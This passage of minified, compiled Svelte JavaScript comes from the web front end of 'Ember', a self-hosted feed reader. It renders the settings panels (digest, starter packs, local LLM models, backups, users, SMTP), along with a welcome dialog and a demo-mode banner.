o=R(i,2),c=I(o);j(o),z(()=>{ji(r,V(Mt)),ji(a,s())}),H(`click`,c,jt),W(e,t)};K(Pn,e=>{V(g)===`mobile`&&e(Fn)});var In=R(Pn,2),Ln=e=>{var t=Wc(),n=R(L(t),4),r=I(n);j(n),H(`click`,r,()=>F(Nt,!0)),W(e,t)};K(In,e=>{V(g)===`filters`&&e(Ln)});var Rn=R(In,2),zn=e=>{var t=Xc(),n=R(L(t),2),r=e=>{var t=Gc(),n=I(t,!0);j(t),z(()=>G(n,V(ne))),W(e,t)};K(n,e=>{V(ne)&&e(r)});var i=R(n,2),a=e=>{W(e,Kc())},o=e=>{var t=Yc(),n=L(t),r=I(n),i=I(r),a=I(i,!0);j(i),Ie(2),j(r);var o=R(r,2),s=I(o),c=I(s,!0);j(s),Ie(2),j(o);var l=R(o,2),u=I(l),d=I(u,!0);j(u),Ie(2),j(l);var f=R(l,2),p=I(f),m=I(p,!0);j(p),Ie(2),j(f);var h=R(f,2),g=I(h),_=I(g,!0);j(g),Ie(2),j(h);var v=R(h,2),y=I(v),b=I(y,!0);j(y),Ie(2),j(v),j(n);var x=R(n,2),S=e=>{var t=Jc(),n=R(L(t),2),r=R(I(n));li(r,21,()=>V(E).top_feeds,e=>e.feed_id,(e,t)=>{var n=qc(),r=I(n),i=I(r,!0);j(r);var a=R(r),o=I(a,!0);j(a),j(n),z(()=>{G(i,V(t).title),G(o,V(t).read_count)}),W(e,n)}),j(r),j(n),W(e,t)};K(x,e=>{V(E).top_feeds&&V(E).top_feeds.length>0&&e(S)}),z(()=>{G(a,V(E).articles_read_today),G(c,V(E).articles_read_week),G(d,V(E).articles_read_month),G(m,V(E).starred_total),G(_,V(E).later_total),G(b,V(E).subscriptions)}),W(e,t)};K(i,e=>{V(E)?e(o,-1):e(a)}),W(e,t)};K(Rn,e=>{V(g)===`stats`&&e(zn)});var Bn=R(Rn,2),Hn=e=>{var t=tl(),n=R(L(t),4),r=e=>{var t=Zc(),n=I(t,!0);j(t),z(()=>G(n,V(C))),W(e,t)};K(n,e=>{V(C)&&e(r)});var i=R(n,2),a=e=>{var t=Qc(),n=I(t,!0);j(t),z(()=>G(n,V(w))),W(e,t)};K(i,e=>{V(w)&&e(a)});var o=R(i,2),s=e=>{W(e,$c())},c=e=>{var t=el(),n=L(t),r=R(I(n),2),i=I(r);let a;var o=R(i,2);let s;j(r),j(n);var c=R(n,2),l=R(I(c),2),u=I(l);u.value=u.__value=`fresh`;var d=R(u);d.value=d.__value=`today`;var f=R(d);f.value=f.__value=`unread`;var p=R(f);p.value=p.__value=`starred`;var m=R(p);m.value=m.__value=`later`,j(l),Ie(2),j(c);var h=R(c,2),g=I(h),_=R(I(g),2);J(_),j(g);var v=R(g,2),y=R(I(v),2);J(y),j(v),j(h);var b=R(h,2),x=R(I(b),2);J(x),j(b);var C=R(b,2),w=I(C),te=I(w,!0);j(w),j(C),z(()=>{a=q(i,1,`svelte-1u3w06f`,null,a,{on:V(S).enabled}),s=q(o,1,`svelte-1u3w06f`,null,s,{on:!V(S).enabled}),w.disabled=V(ee),G(te,V(ee)?`Saving…`:`Save`)}),H(`click`,i,()=>V(S).enabled=!0),H(`click`,o,()=>V(S).enabled=!1),Ti(l,()=>V(S).view_value,e=>V(S).view_value=e),H(`change`,l,()=>V(S).view_kind=`smart`),X(_,()=>V(S).hour_utc,e=>V(S).hour_utc=e),X(y,()=>V(S).minute_utc,e=>V(S).minute_utc=e),X(x,()=>V(S).email_override,e=>V(S).email_override=e),H(`click`,w,T),W(e,t)};K(o,e=>{V(S)?e(c,-1):e(s)}),W(e,t)};K(Bn,e=>{V(g)===`digest`&&e(Hn)});var Un=R(Bn,2),Wn=e=>{var t=sl(),n=R(L(t),4),r=e=>{var t=nl(),n=I(t,!0);j(t),z(()=>G(n,V(we))),W(e,t)};K(n,e=>{V(we)&&e(r)});var i=R(n,2),a=e=>{var t=rl(),n=I(t,!0);j(t),z(()=>G(n,V(Ce))),W(e,t)};K(i,e=>{V(Ce)&&e(a)});var o=R(i,2);li(o,21,()=>V(xe),e=>e.slug,(e,t)=>{let n=Qt(()=>Te(V(t)));var r=ol(),i=I(r),a=I(i),o=I(a),s=R(o);j(a);var c=R(a,2),l=I(c),u=R(l),d=e=>{var n=Qr();z(()=>G(n,`· ${V(t).subscribed??``} subscribed`)),W(e,n)};K(u,e=>{V(t).subscribed>0&&!V(n)&&e(d)}),j(c),j(i);var f=R(i,2),p=e=>{var n=il(),r=I(n,!0);j(n),z(()=>{n.disabled=V(Se)===V(t).slug,Y(n,`data-testid`,`starter-remove-${V(t).slug??``}`),G(r,V(Se)===V(t).slug?`Removing…`:`Remove pack`)}),H(`click`,n,()=>Oe(V(t).slug)),W(e,n)},m=e=>{var n=al(),r=I(n,!0);j(n),z(()=>{n.disabled=V(Se)===V(t).slug,Y(n,`data-testid`,`starter-import-${V(t).slug??``}`),G(r,V(Se)===V(t).slug?`Adding…`:`Add pack`)}),H(`click`,n,()=>De(V(t).slug)),W(e,n)};K(f,e=>{V(n)?e(p):e(m,-1)}),j(r),z(()=>{Si(o,`background:${V(t).color??``}`),G(s,` ${V(t).name??``}`),G(l,`${V(t).feed_urls.length??``} feeds`)}),W(e,r)}),j(o),W(e,t)};K(Un,e=>{V(g)===`starter`&&e(Wn)});var Gn=R(Un,2),Kn=e=>{var t=xl(),n=R(L(t),4),r=e=>{var t=cl(),n=I(t,!0);j(t),z(()=>G(n,V(Ae))),W(e,t)};K(n,e=>{V(Ae)&&e(r)});var i=R(n,2),a=e=>{var t=ll(),n=I(t,!0);j(t),z(()=>G(n,V(je))),W(e,t)};K(i,e=>{V(je)&&e(a)});var o=R(i,2),s=e=>{W(e,ul())},c=e=>{W(e,dl())},l=e=>{var t=bl(),n=R(L(t),2),r=R(I(n)),i=I(r,!0);j(r);var a=R(r,3),o=I(a,!0);j(a);var s=R(a,3),c=I(s,!0);j(s);var l=R(s,3),u=I(l,!0);j(l),j(n);var d=R(n,4),f=I(d),p=I(f),m=I(p,!0);j(p);var h=R(p,2),g=I(h,!0);j(h),j(f);var _=R(f,2),v=e=>{var t=fl();z(e=>t.disabled=e,[()=>V(Me).startsWith(`switch:`)||V(Me).startsWith(`pull:`)]),H(`click`,t,()=>A(V(ke).recommended.model)),W(e,t)};K(_,e=>{!V(ke).recommended.disable_llm&&V(ke).recommended.model!==V(ke).current_model&&e(v)}),j(d);var y=R(d,4),b=I(y),x=I(b,!0);j(b),j(y);var S=R(y,4),C=e=>{var t=pl(),n=I(t);j(t),z(()=>G(n,`Couldn't list installed models: ${V(ke).installed_err??``}`)),W(e,t)},w=e=>{W(e,ml())},ee=e=>{var t=vl(),n=R(I(t));li(n,21,()=>V(ke).installed,e=>e.name,(e,t)=>{var n=_l(),r=I(n),i=I(r),a=I(i,!0);j(i),j(r);var o=R(r),s=I(o,!0);j(o);var c=R(o),l=I(c),u=e=>{W(e,hl())},d=e=>{var n=gl(),r=L(n),i=I(r,!0);j(r);var a=R(r,2),o=I(a,!0);j(a),z(()=>{r.disabled=V(Me)!==``,Y(r,`data-testid`,`llm-switch-${V(t).name??``}`),G(i,V(Me)===`switch:`+V(t).name?`Switching…`:`Use`),a.disabled=V(Me)!==``,Y(a,`data-testid`,`llm-delete-${V(t).name??``}`),G(o,V(Me)===`delete:`+V(t).name?`Deleting…`:`Delete`)}),H(`click`,r,()=>A(V(t).name)),H(`click`,a,()=>Pe(V(t).name)),W(e,n)};K(l,e=>{V(t).name===V(ke).current_model?e(u):e(d,-1)}),j(c),j(n),z(e=>{G(a,V(t).name),G(s,e)},[()=>Ke(V(t).size_bytes)]),W(e,n)}),j(n),j(t),W(e,t)};K(S,e=>{V(ke).installed_err?e(C):!V(ke).installed||V(ke).installed.length===0?e(w,1):e(ee,-1)});var te=R(S,6),T=e=>{var t=yl(),n=I(t,!0);j(t),z(()=>G(n,V(Ve))),W(e,t)};K(te,e=>{V(Ve)&&e(T)});var E=R(te,2),ne=I(E),re=I(ne),D=R(I(re)),O=I(D,!0);j(D),j(re);var ie=R(re,2);J(ie),Ie(2),j(ne);var ae=R(ne,2),oe=I(ae),se=R(I(oe)),ce=I(se,!0);j(se),j(oe);var le=R(oe,2);J(le),Ie(2),j(ae);var ue=R(ae,2),de=I(ue),fe=R(I(de)),pe=I(fe,!0);j(fe),j(de);var me=R(de,2);J(me),Ie(2),j(ue),j(E);var he=R(E,2),ge=I(he),_e=I(ge,!0);j(ge),j(he);var ve=R(he,6),ye=I(ve);J(ye);var be=R(ye,2),xe=I(be,!0);j(be),j(ve),z((e,t,n,r,a)=>{G(i,e),G(o,V(ke).system.cpus),G(c,V(ke).system.gpu||`none detected`),G(u,V(ke).system.os),G(m,V(ke).recommended.disable_llm?`Disable summaries`:V(ke).recommended.model),G(g,V(ke).recommended.reason),G(x,V(ke).current_model||`(none)`),G(O,t),G(ce,n),G(pe,V(ze)||`default`),ge.disabled=V(Be),G(_e,V(Be)?`Saving…`:`Save tuning`),be.disabled=r,G(xe,a)},[()=>Ge(V(ke).system.ram_bytes),()=>(+V(Le)).toFixed(2),()=>(+V(Re)).toFixed(2),()=>!V(k).trim()||V(Me).startsWith(`pull:`),()=>V(Me).startsWith(`pull:`)?`Pulling…`:`Pull`]),X(ie,()=>V(Le),e=>F(Le,e)),X(le,()=>V(Re),e=>F(Re,e)),X(me,()=>V(ze),e=>F(ze,e)),H(`click`,ge,Ue),X(ye,()=>V(k),e=>F(k,e)),H(`click`,be,We),W(e,t)};K(o,e=>{V(ke)?V(ke).enabled?e(l,-1):e(c,1):e(s)}),W(e,t)};K(Gn,e=>{V(g)===`llm`&&i()?.is_admin&&e(Kn)});var qn=R(Gn,2),Jn=e=>{var t=wl(),n=R(L(t),4),r=e=>{var t=Sl(),n=I(t,!0);j(t),z(()=>G(n,V(ge))),W(e,t)};K(n,e=>{V(ge)&&e(r)});var i=R(n,2),a=e=>{var t=Cl(),n=I(t,!0);j(t),z(()=>G(n,V(he))),W(e,t)};K(i,e=>{V(he)&&e(a)});var o=R(i,2),s=R(I(o),2);J(s),j(o);var c=R(o,2),l=R(I(c),2);J(l),j(c);var u=R(c,2),d=R(I(u),2);J(d),Ie(2),j(u);var f=R(u,2),p=I(f),m=R(p,2),h=I(m,!0);j(m),j(f),z(()=>{p.disabled=V(_e),m.disabled=V(_e),G(h,V(_e)?`Saving…`:`Save`)}),X(s,()=>V(me).name,e=>V(me).name=e),X(l,()=>V(me).page_title,e=>V(me).page_title=e),X(d,()=>V(me).favicon_url,e=>V(me).favicon_url=e),H(`click`,p,be),H(`click`,m,ye),W(e,t)};K(qn,e=>{V(g)===`branding`&&i()?.is_admin&&e(Jn)});var Yn=R(qn,2),Xn=e=>{var t=jl(),n=R(L(t),2),r=e=>{var t=Tl(),n=I(t,!0);j(t),z(()=>G(n,V(O))),W(e,t)};K(n,e=>{V(O)&&e(r)});var i=R(n,2),a=e=>{var t=El(),n=I(t,!0);j(t),z(()=>G(n,V(ie))),W(e,t)};K(i,e=>{V(ie)&&e(a)});var o=R(i,2),s=e=>{W(e,Dl())},c=e=>{var t=Al(),n=R(L(t),2),r=R(I(n)),i=I(r,!0);j(r);var a=R(r,3),o=I(a,!0);j(a);var s=R(a,3),c=I(s),l=I(c,!0);j(c),j(s),j(n);var u=R(n,4),d=R(I(u)),f=I(d,!0);j(d),Ie(),j(u);var p=R(u,2),m=I(p),h=I(m,!0);j(m),j(p);var g=R(p,2),_=e=>{var t=kl(),n=R(L(t),2),r=R(I(n));li(r,21,()=>(V(D).backups??[]).slice(0,8),e=>e.path,(e,t)=>{var n=Ol(),r=I(n),i=I(r),a=I(i,!0);j(i),j(r);var o=R(r),s=I(o,!0);j(o);var c=R(o),l=I(c,!0);j(c),j(n),z((e,t,n)=>{G(a,e),G(s,t),G(l,n)},[()=>V(t).path.split(`/`).slice(-1)[0],()=>fe(V(t).size_bytes),()=>pe(V(t).created_at)]),W(e,n)}),j(r),j(n),W(e,t)};K(g,e=>{(V(D).backups?.length??0)>0&&e(_)});var v=R(g,6),y=I(v),b=R(I(y),2);J(b),j(y);var x=R(y,2),S=I(x,!0);j(x),j(v);var C=R(v,6),w=I(C),ee=R(I(w),2),te=I(ee);j(ee),j(w);var T=R(w,2),E=I(T);let ne;var re=R(E,2);let O;var ie=R(re,2);let se;j(T),j(C);var ue=R(C,2),me=I(ue),he=R(I(me),2),ge=I(he);j(he),j(me);var _e=R(me,2),ve=I(_e);let ye;var be=R(ve,2);let xe;var Se=R(be,2);let Ce;j(_e),j(ue);var we=R(ue,2),Te=R(I(we),2),Ee=I(Te);let De;var Oe=R(Ee,2);let ke;var Ae=R(Oe,2);let je;j(Te),j(we);var Me=R(we,2),k=I(Me),Ne=R(I(k),2);J(Ne),j(k);var A=R(k,2),Pe=R(I(A),2);J(Pe),j(A),j(Me);var Fe=R(Me,2),Le=I(Fe),Re=I(Le,!0);j(Le),j(Fe),z((e,t)=>{G(i,e),G(o,t),G(l,V(D).backup_dir),G(f,V(D).backup_dir),m.disabled=V(ae)===`backup`,G(h,V(ae)===`backup`?`Backing up…`:`Back up now`),x.disabled=V(ae)===`cleanup`,G(S,V(ae)===`cleanup`?`Cleaning…`:`Clean up now`),G(te,`Keep the ${V(D).backup_keep_count??``} most recent.`),ne=q(E,1,`svelte-1u3w06f`,null,ne,{on:V(D).backup_schedule===`off`}),O=q(re,1,`svelte-1u3w06f`,null,O,{on:V(D).backup_schedule===`daily`}),se=q(ie,1,`svelte-1u3w06f`,null,se,{on:V(D).backup_schedule===`weekly`}),G(ge,`Older than ${V(D).cleanup_older_days??``} days, when scheduled.`),ye=q(ve,1,`svelte-1u3w06f`,null,ye,{on:V(D).cleanup_schedule===`off`}),xe=q(be,1,`svelte-1u3w06f`,null,xe,{on:V(D).cleanup_schedule===`weekly`}),Ce=q(Se,1,`svelte-1u3w06f`,null,Ce,{on:V(D).cleanup_schedule===`monthly`}),De=q(Ee,1,`svelte-1u3w06f`,null,De,{on:(V(D).opml_schedule||`off`)===`off`}),ke=q(Oe,1,`svelte-1u3w06f`,null,ke,{on:V(D).opml_schedule===`weekly`}),je=q(Ae,1,`svelte-1u3w06f`,null,je,{on:V(D).opml_schedule===`monthly`}),Le.disabled=V(ae)===`schedule`,G(Re,V(ae)===`schedule`?`Saving…`:`Save schedule`)},[()=>fe(V(D).size_bytes),()=>V(D).page_count.toLocaleString()]),H(`click`,m,ce),X(b,()=>V(oe),e=>F(oe,e)),H(`click`,x,le),H(`click`,E,()=>V(D).backup_schedule=`off`),H(`click`,re,()=>V(D).backup_schedule=`daily`),H(`click`,ie,()=>V(D).backup_schedule=`weekly`),H(`click`,ve,()=>V(D).cleanup_schedule=`off`),H(`click`,be,()=>V(D).cleanup_schedule=`weekly`),H(`click`,Se,()=>V(D).cleanup_schedule=`monthly`),H(`click`,Ee,()=>V(D).opml_schedule=`off`),H(`click`,Oe,()=>V(D).opml_schedule=`weekly`),H(`click`,Ae,()=>V(D).opml_schedule=`monthly`),X(Ne,()=>V(D).backup_keep_count,e=>V(D).backup_keep_count=e),X(Pe,()=>V(D).cleanup_older_days,e=>V(D).cleanup_older_days=e),H(`click`,Le,de),W(e,t)};K(o,e=>{V(D)?e(c,-1):e(s)}),W(e,t)};K(Yn,e=>{V(g)===`database`&&i()?.is_admin&&e(Xn)});var Zn=R(Yn,2),Qn=e=>{var t=zl(),n=R(L(t),4),r=e=>{var t=Ml(),n=I(t,!0);j(t),z(()=>G(n,V(Ft))),W(e,t)};K(n,e=>{V(Ft)&&e(r)});var a=R(n,2),o=e=>{var t=Nl(),n=I(t,!0);j(t),z(()=>G(n,V(It))),W(e,t)};K(a,e=>{V(It)&&e(o)});var s=R(a,4),c=I(s),l=R(I(c),2);J(l),j(c);var u=R(c,2),d=R(I(u),2);J(d),j(u),j(s);var f=R(s,2),p=I(f),m=R(I(p),2);J(m),j(p),j(f);var h=R(f,2),g=R(I(h),2),_=I(g);let v;var y=R(_,2);let b;j(g),j(h);var x=R(h,2),S=I(x),C=I(S,!0);j(S),j(x);var w=R(x,4),ee=e=>{W(e,Pl())},te=e=>{var t=Rl(),n=R(I(t));li(n,21,()=>V(Pt),e=>e.id,(e,t)=>{var n=Ll(),r=I(n),a=I(r),o=I(a,!0);j(a);var s=R(a,2),c=e=>{W(e,Fl())};K(s,e=>{i()?.id===V(t).id&&e(c)}),j(r);var l=R(r),u=I(l,!0);j(l);var d=R(l),f=I(d),p=I(f);let m;var h=R(p,2);let g;j(f),j(d);var _=R(d),v=I(_),y=e=>{var n=Il(),r=I(n,!0);j(n),z(()=>{n.disabled=V(Lt)===`delete:${V(t).id}`,Y(n,`data-testid`,`user-delete-${V(t).id??``}`),G(r,V(Lt)===`delete:${V(t).id}`?`Deleting…`:`Delete`)}),H(`click`,n,()=>Gt(V(t))),W(e,n)};K(v,e=>{i()?.id!==V(t).id&&e(y)}),j(_),j(n),z(()=>{Y(n,`data-testid`,`user-row-${V(t).id??``}`),G(o,V(t).username),G(u,V(t).email||`—`),p.disabled=V(Lt)===`admin:${V(t).id}`||i()?.id===V(t).id,Y(p,`data-testid`,`user-admin-yes-${V(t).id??``}`),Y(p,`title`,i()?.id===V(t).id?`Cannot change your own admin status`:``),m=q(p,1,`svelte-1u3w06f`,null,m,{on:V(t).is_admin}),h.disabled=V(Lt)===`admin:${V(t).id}`||i()?.id===V(t).id,Y(h,`data-testid`,`user-admin-no-${V(t).id??``}`),Y(h,`title`,i()?.id===V(t).id?`Cannot change your own admin status`:``),g=q(h,1,`svelte-1u3w06f`,null,g,{on:!V(t).is_admin})}),H(`click`,p,()=>Wt(V(t))),H(`click`,h,()=>Wt(V(t))),W(e,n)}),j(n),j(t),W(e,t)};K(w,e=>{V(Pt).length===0?e(ee):e(te,-1)}),z(()=>{v=q(_,1,`svelte-1u3w06f`,null,v,{on:V(Vt)}),b=q(y,1,`svelte-1u3w06f`,null,b,{on:!V(Vt)}),S.disabled=V(Lt)===`create`,G(C,V(Lt)===`create`?`Creating…`:`Create user`)}),X(l,()=>V(Rt),e=>F(Rt,e)),X(d,()=>V(zt),e=>F(zt,e)),X(m,()=>V(Bt),e=>F(Bt,e)),H(`click`,_,()=>F(Vt,!0)),H(`click`,y,()=>F(Vt,!1)),H(`click`,S,Ut),W(e,t)};K(Zn,e=>{V(g)===`users`&&i()?.is_admin&&e(Qn)});var $n=R(Zn,2),er=e=>{var t=Wl(),n=R(L(t),4),r=e=>{var t=Bl(),n=I(t,!0);j(t),z(()=>G(n,V(ct))),W(e,t)};K(n,e=>{V(ct)&&e(r)});var i=R(n,2),a=e=>{var t=Vl(),n=I(t,!0);j(t),z(()=>G(n,V(st))),W(e,t)};K(i,e=>{V(st)&&e(a)});var o=R(i,2),s=e=>{var t=Hl(),n=I(t),r=R(n),i=I(r);j(r),j(t),z(e=>{G(n,`Active TTL: ${e??``}h `),G(i,`(${V(at).source===`admin`?`set in admin UI`:`default / env var`})`)},[()=>Math.round(V(at).ttl_seconds/3600)]),W(e,t)};K(o,e=>{V(at)&&e(s)});var c=R(o,2),l=R(I(c),2);li(l,21,()=>ft,ai,(e,t)=>{var n=Ul(),r=I(n,!0);j(n);var i={};z(()=>{G(r,V(t).label),i!==(i=V(t).seconds)&&(n.value=(n.__value=V(t).seconds)??``)}),W(e,n)}),j(l),j(c);var u=R(c,2),d=R(I(u),2);J(d),j(u);var f=R(u,2),p=I(f),m=I(p,!0);j(p),j(f),z(()=>{p.disabled=V(lt),G(m,V(lt)?`Saving…`:`Save`)}),Ti(l,()=>V(ot),e=>F(ot,e)),X(d,()=>V(ot),e=>F(ot,e)),H(`click`,p,dt),W(e,t)};K($n,e=>{V(g)===`session`&&i()?.is_admin&&e(er)});var tr=R($n,2),nr=e=>{var t=Xl(),n=R(L(t),4),r=I(n),i=R(I(r));J(i),j(r);var a=R(r,2),o=R(I(a));J(o),j(a);var s=R(a,2),c=R(I(s));J(c),j(s);var l=R(s,2),u=R(I(l)),d=e=>{var t=Gl();J(t),X(t,()=>V(pt).password,e=>V(pt).password=e),W(e,t)},f=e=>{var t=Kl();J(t),X(t,()=>V(pt).password,e=>V(pt).password=e),W(e,t)};K(u,e=>{V(mt)?.smtp.password_set&&!V(pt).password&&!V(pt).clear_password?e(d):e(f,-1)}),j(l);var p=R(l,2),m=R(I(p));J(m),j(p),j(n);var h=R(n,2),g=R(I(h),2),_=I(g);J(_),Ie(2),j(g),j(h);var v=R(h,2),y=e=>{var t=ql(),n=I(t);J(n),Ie(),j(t),Fi(n,()=>V(pt).clear_password,e=>V(pt).clear_password=e),W(e,t)};K(v,e=>{V(mt)?.smtp.password_set&&e(y)});var b=R(v,2),x=e=>{var t=Jl(),n=I(t,!0);j(t),z(()=>G(n,V(_t))),W(e,t)};K(b,e=>{V(_t)&&e(x)});var S=R(b,2),C=e=>{var t=Yl(),n=I(t,!0);j(t),z(()=>G(n,V(yt))),W(e,t)};K(S,e=>{V(yt)&&e(C)});var w=R(S,2),ee=I(w),te=I(ee,!0);j(ee),j(w);var T=R(w,8),E=I(T),ne=R(I(E));J(ne),j(E);var re=R(E,2),D=I(re,!0);j(re),j(T);var O=R(T,8),ie=R(I(O));J(ie),j(O);var ae=R(O,2),oe=I(ae),se=I(oe,!0);j(oe),j(ae),z(()=>{ee.disabled=V(ht),G(te,V(ht)?`Saving…`:`Save`),re.disabled=V(xt),G(D,V(xt)?`Sending…`:`Send test`),oe.disabled=V(ht),G(se,V(ht)?`Saving…`:`Save`)}),X(i,()=>V(pt).host,e=>V(pt).host=e),X(o,()=>V(pt).port,e=>V(pt).port=e),X(c,()=>V(pt).username,e=>V(pt).username=e),X(m,()=>V(pt).from,e=>V(pt).from=e),Fi(_,()=>V(pt).starttls,e=>V(pt).starttls=e),H(`click`,ee,St),X(ne,()=>V(bt),e=>F(bt,e)),H(`click`,re,Ct),X(ie,()=>V(pt).initial_backlog_hours,e=>V(pt).initial_backlog_hours=e),H(`click`,oe,St),W(e,t)};K(tr,e=>{V(g)===`email`&&i()?.is_admin&&e(nr)});var rr=R(tr,2),ir=e=>{var t=$l(),n=R(L(t),2),r=R(I(n),2),i=I(r),a=e=>{let t=Qt(()=>u().split(`-`)[0]);var n=Zl(),r=I(n,!0);j(n),z(()=>{Y(n,`href`,`https://github.com/brandonhon/ember/releases/tag/${V(t)}`),G(r,u())}),W(e,n)},o=Qt(()=>u().startsWith(`v`)),s=e=>{var t=Ql(),n=I(t,!0);j(t),z(()=>G(n,u())),W(e,t)};K(i,e=>{V(o)?e(a):e(s,-1)}),j(r),Ie(6),j(n),W(e,t)};K(rr,e=>{V(g)===`about`&&e(ir)}),j(Dn),j(rn),j(Yt);var ar=R(Yt,2),or=e=>{Tc(e,{onClose:()=>F(Nt,!1)})};K(ar,e=>{V(Nt)&&e(or)});var sr=R(ar,2),cr=e=>{{let t=Qt(()=>V(p).confirmLabel??`Confirm`),n=Qt(()=>V(p).destructive??!1);So(e,{get title(){return V(p).title},get message(){return V(p).message},get confirmLabel(){return V(t)},get destructive(){return V(n)},get busy(){return V(m)},onConfirm:h,onCancel:()=>F(p,null)})}};K(sr,e=>{V(p)&&e(cr)}),j(Jt),z(()=>{Xt=q(Yt,1,`modal svelte-1u3w06f`,null,Xt,{mobile:V(_)}),Y(rn,`data-view`,V(_)?V(v)?`detail`:`list`:`split`),sn=q(on,1,`svelte-1u3w06f`,null,sn,{active:V(g)===`profile`}),ln=q(cn,1,`svelte-1u3w06f`,null,ln,{active:V(g)===`passkeys`}),dn=q(un,1,`svelte-1u3w06f`,null,dn,{active:V(g)===`preferences`}),pn=q(fn,1,`svelte-1u3w06f`,null,pn,{active:V(g)===`mobile`}),gn=q(mn,1,`svelte-1u3w06f`,null,gn,{active:V(g)===`filters`}),vn=q(_n,1,`svelte-1u3w06f`,null,vn,{active:V(g)===`stats`}),bn=q(yn,1,`svelte-1u3w06f`,null,bn,{active:V(g)===`digest`}),Sn=q(xn,1,`svelte-1u3w06f`,null,Sn,{active:V(g)===`starter`}),En=q(Tn,1,`svelte-1u3w06f`,null,En,{active:V(g)===`about`})}),H(`click`,nn,qt),H(`click`,on,()=>y(`profile`)),H(`click`,cn,()=>y(`passkeys`)),H(`click`,un,()=>y(`preferences`)),H(`click`,fn,()=>y(`mobile`)),H(`click`,mn,()=>y(`filters`)),H(`click`,_n,()=>y(`stats`)),H(`click`,yn,()=>y(`digest`)),H(`click`,xn,()=>y(`starter`)),H(`click`,Tn,()=>y(`about`)),H(`click`,Yt,Bi(function(e){Ui.call(this,t,e)})),H(`click`,Jt,qt),W(e,Jt),Je(),f()}var nu=U(`<div class="backdrop svelte-1et61ur" role="dialog" aria-modal="true" aria-labelledby="welcome-title" data-testid="welcome-modal"><div class="card svelte-1et61ur"><header class="svelte-1et61ur"><h2 id="welcome-title" class="svelte-1et61ur">Welcome to Ember</h2> <button class="close svelte-1et61ur" aria-label="Close">×</button></header> <p class="svelte-1et61ur">Ember is your self-hosted reader. Start by adding feeds — pick a curated
+      pack to subscribe in one click, paste a feed URL into the sidebar <strong>+ Add feed</strong> button, or import an OPML file from another reader.</p> <div class="actions svelte-1et61ur"><button class="primary svelte-1et61ur" data-testid="welcome-browse">Browse starter packs</button> <a class="docs-link svelte-1et61ur" href="https://brandonhon.github.io/ember/getting-started" target="_blank" rel="noopener" data-testid="welcome-docs">Read the docs ↗</a></div></div></div>`);function ru(e,t){qe(t,!0);function n(){location.hash=`#starter`,window.dispatchEvent(new CustomEvent(`ember:open-settings`,{detail:`starter`})),t.onClose()}function r(e){e.key===`Escape`&&(e.preventDefault(),t.onClose())}Gi(()=>window.addEventListener(`keydown`,r)),Ki(()=>window.removeEventListener(`keydown`,r));var i=nu(),a=I(i),o=I(a),s=R(I(o),2);j(o);var c=R(o,4),l=I(c);Ie(2),j(c),j(a),j(i),H(`click`,s,function(...e){t.onClose?.apply(this,e)}),H(`click`,l,n),H(`click`,a,Bi(function(e){Ui.call(this,t,e)})),H(`click`,i,function(...e){t.onClose?.apply(this,e)}),W(e,i),Je()}We();var iu=U(`<div class="demo-banner svelte-y0mbvj" role="note" aria-label="Demo mode"><span class="dot svelte-y0mbvj" aria-hidden="true"></span> <span class="txt svelte-y0mbvj"><strong>Demo mode</strong> <span class="muted svelte-y0mbvj"> </span></span> <a class="cta svelte-y0mbvj">Self-host&nbsp;→</a></div>`);function au(e,t){qe(t,!1);let n=`/ember/demo/`.replace(/demo\/?$/,``)||`/`;Vi();var r=iu(),i=R(I(r),2),a=R(I(i),2),o=I(a);j(a),j(i);var s=R(i,2);j(r),z(()=>{G(o,`— data frozen${so?` as of ${so}`:``}; changes reset on reload`),Y(s,`href`,n)}),W(e,r),Je()}var ou=U(`<div class="dn-scrim svelte-1whqzth" role="presentation"><div class="dn-card svelte-1whqzth" role="dialog" aria-modal="true" aria-label="Demo notice"><div class="dn-mark svelte-1whqzth" aria-hidden="true">✦</div> <h2 class="svelte-1whqzth">This is a live demo</h2> <p class="svelte-1whqzth">You're browsing a frozen snapshot — reading, starring and searching work,
+        but changes aren't saved and management actions are disabled.</p> <p class="muted svelte-1whqzth">Self-host Ember to add your own feeds, run the AI summaries, and keep everything.</p> <div class="dn-actions svelte-1whqzth"><button class="dn-secondary svelte-1whqzth" type="button">Keep exploring</button> <a class="dn-primary svelte-1whqzth">Self-host Ember →</a></div></div></div>`);function su(e,t){qe(t,!1);let n=()=>M(io,`$demoNotice`,r),[r,i]=gt(),a=`/ember/demo/`.replace(/demo\/?$/,``)||`/`;function o(){io.set(!1)}Vi();var s=$r(),c=L(s),l=e=>{var n=ou(),r=I(n),i=R(I(r),8),s=I(i),c=R(s,2);j(i),j(r),j(n),z(()=>Y(c,`href`,a)),H(`click`,s,o),H(`click`,r,Bi(function(e){Ui.call(this,t,e)})),H(`click`,n,o),W(e,n)};K(c,e=>{n()&&e(l)}),W(e,s),Je(),i()}var cu=U(`<!> <!>`,1),lu=U(`<p class="boot svelte-1n46o8q">Loading…</p>`),uu=U(`<div class="mobile-scrim svelte-1n46o8q" role="presentation"></div>`),du=U(`<!> <div><!></div> <!>`,1),fu=U(`<!> <!> <!>`,1),pu=U(`<div><!> <div><!></div></div> <!> <!> <!>`,1),mu=U(`<!> <!>`,1);function hu(e,t){qe(t,!0);let n=()=>M(Yi,`$user`,u),r=()=>M(ba,`$branding`,u),i=()=>M(ka,`$newArticleCount`,u),a=()=>M(fa,`$selectedArticleId`,u),o=()=>M(ha,`$theme`,u),s=()=>M(va,`$customPalette`,u),c=()=>M(Ca,`$sidebarCollapsed`,u),l=()=>M(na,`$feeds`,u),[u,d]=gt(),f=()=>{},p=P(!1),m=P(!1),h=P(!1),g=`ember:welcome-seen`,_=P(!1),v=P(!1);function y(e){let t=ft(Da).items;if(t.length===0)return;let n=ft(fa),r=n===null?-1:t.findIndex(e=>e.id===n),i=Math.max(0,Math.min(t.length-1,r+e));fa.set(t[i].id)}function b(){let e=ft(fa);return e===null?null:ft(Da).items.find(t=>t.id===e)??null}function x(e){switch(e){case`next`:y(1);return;case`prev`:y(-1);return;case`toggle-read`:{let e=b();e&&Ma([e.id],!e.is_read);return}case`toggle-star`:{let e=b();e&&Na(e.id,!e.is_starred);return}case`open-original`:{let e=b();e?.url&&window.open(e.url,`_blank`,`noopener,noreferrer`);return}case`refresh`:ca(),ja(ft(da));return;case`focus-search`:document.querySelector(`input[data-testid="search-input"]`)?.focus();return;case`show-help`:F(m,!0);return}}function S(){Yi.set(null)}function C(){F(h,!0)}let w=null;function ee(){te(),w=setInterval(()=>{document.hidden||(Aa(),ft(sa).pending_summary>0&&la())},15e3)}function te(){w&&=(clearInterval(w),null)}function 